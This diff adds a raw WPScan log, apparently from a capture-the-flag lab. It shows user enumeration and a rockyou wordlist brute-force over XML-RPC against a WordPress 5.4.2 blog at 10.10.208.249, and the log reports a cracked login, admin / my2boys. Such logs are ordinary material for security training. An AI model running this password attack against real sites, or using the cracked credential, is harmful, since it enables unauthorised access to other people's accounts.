@@ -1,0 +1,109 @@
+❯ wpscan --url 10.10.208.249/blog -e --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.22
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://10.10.208.249/blog/ [10.10.208.249]
+[+] Started: Tue Jul 19 13:17:51 2022
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.10.208.249/blog/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://10.10.208.249/blog/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.10.208.249/blog/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://10.10.208.249/blog/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.2'
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://10.10.208.249/blog/, Match: 'WordPress 5.4.2'
+
+[i] The main theme could not be detected.
+
+[+] Enumerating Vulnerable Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
+ Checking Known Locations - Time: 00:00:05 <============================================================================================================================================================> (473 / 473) 100.00% Time: 00:00:05
+
+[i] No themes Found.
+
+[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
+ Checking Known Locations - Time: 00:00:05 <==========================================================================================================================================================> (2568 / 2568) 100.00% Time: 00:00:05
+
+[i] No Timthumbs Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:00 <=============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:00
+
+[i] No Config Backups Found.
+
+[+] Enumerating DB Exports (via Passive and Aggressive Methods)
+ Checking DB Exports - Time: 00:00:00 <===================================================================================================================================================================> (71 / 71) 100.00% Time: 00:00:00
+
+[i] No DB Exports Found.
+
+[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
+ Brute Forcing Attachment IDs - Time: 00:00:01 <========================================================================================================================================================> (100 / 100) 10.00% Time: 00:00:01
+
+[i] No Medias Found.
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:00 <==============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00
+
+[i] User(s) Identified:
+
+[+] admin
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] Performing password attack on Xmlrpc against 1 user/s
+[SUCCESS] - admin / my2boys                                                                                                                                                                                                                 
+Trying admin / lizzy Time: 00:00:55 <                                                                                                                                                              > (3900 / 14348292)  0.02%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: admin, Password: my2boys
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Tue Jul 19 13:19:08 2022
+[+] Requests Done: 7266
+[+] Cached Requests: 40
+[+] Data Sent: 2.947 MB
+[+] Data Received: 2.772 MB
+[+] Memory used: 234.48 MB
+[+] Elapsed time: 00:01:160
